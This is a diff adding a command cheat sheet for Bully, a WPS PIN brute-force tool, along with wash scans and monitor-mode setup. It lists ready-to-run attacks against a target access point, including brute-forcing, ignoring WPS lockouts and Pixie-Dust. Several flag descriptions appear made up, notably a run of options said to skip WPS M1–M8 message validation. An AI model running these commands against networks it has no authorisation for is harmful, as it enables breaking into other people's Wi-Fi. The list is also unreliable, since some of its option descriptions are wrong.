@@ -1,0 +1,97 @@
+[X] Bully Command List
+
+[\] bully -b AA:BB:CC:DD:EE:FF -c 6 -B -v 3 -F -w
+[/] Start Bully attack with common recommended options
+
+[\] bully -b AA:BB:CC:DD:EE:FF
+[/] Run Bully against target BSSID
+
+[\] bully -b AA:BB:CC:DD:EE:FF -v 3
+[/] Enable verbose output level 3
+
+[\] bully -b AA:BB:CC:DD:EE:FF -c 6
+[/] Lock interface to channel 6
+
+[\] bully -b AA:BB:CC:DD:EE:FF -p 12345670
+[/] Use a specific WPS PIN
+
+[\] bully -b AA:BB:CC:DD:EE:FF -B
+[/] Use brute‑force mode
+
+[\] bully -b AA:BB:CC:DD:EE:FF -F
+[/] Ignore WPS lockouts
+
+[\] bully -b AA:BB:CC:DD:EE:FF -S
+[/] Use small DH keys (faster on some APs)
+
+[\] bully -b AA:BB:CC:DD:EE:FF -T 5
+[/] Set timeout to 5 seconds
+
+[\] bully -b AA:BB:CC:DD:EE:FF -t 3
+[/] Set M5/M7 timeout to 3 seconds
+
+[\] bully -b AA:BB:CC:DD:EE:FF -r 3:15
+[/] Retry every 3 attempts with 15‑second pause
+
+[\] bully -b AA:BB:CC:DD:EE:FF -w
+[/] Write session data to file
+
+[\] bully -b AA:BB:CC:DD:EE:FF -o output.txt
+[/] Save output to file
+
+[\] bully -b AA:BB:CC:DD:EE:FF -d
+[/] Disable channel hopping
+
+[\] bully -b AA:BB:CC:DD:EE:FF -K
+[/] Enable Pixie‑Dust attack (if supported)
+
+[\] bully -b AA:BB:CC:DD:EE:FF -1
+[/] Skip WPS M1 message validation
+
+[\] bully -b AA:BB:CC:DD:EE:FF -2
+[/] Skip WPS M2 message validation
+
+[\] bully -b AA:BB:CC:DD:EE:FF -3
+[/] Skip WPS M3 message validation
+
+[\] bully -b AA:BB:CC:DD:EE:FF -4
+[/] Skip WPS M4 message validation
+
+[\] bully -b AA:BB:CC:DD:EE:FF -5
+[/] Skip WPS M5 message validation
+
+[\] bully -b AA:BB:CC:DD:EE:FF -6
+[/] Skip WPS M6 message validation
+
+[\] bully -b AA:BB:CC:DD:EE:FF -7
+[/] Skip WPS M7 message validation
+
+[\] bully -b AA:BB:CC:DD:EE:FF -8
+[/] Skip WPS M8 message validation
+
+[\] bully --session=session.wps
+[/] Resume previous Bully session
+
+[\] wash -i wlan0mon
+[/] Scan for WPS‑enabled networks (companion tool)
+
+[\] wash -i wlan0mon -o wash.txt
+[/] Save WPS scan results
+
+[\] wash -i wlan0mon -s
+[/] Show only WPS‑locked networks
+
+[\] wash -i wlan0mon -j
+[/] Output results in JSON format
+
+[\] sudo ip link set wlan0 down
+[/] Bring interface down
+
+[\] sudo iwconfig wlan0 mode monitor
+[/] Enable monitor mode manually
+
+[\] sudo ip link set wlan0 up
+[/] Bring interface up
+
+[\] sudo airmon-ng check kill
+[/] Kill processes interfering with monitor mode
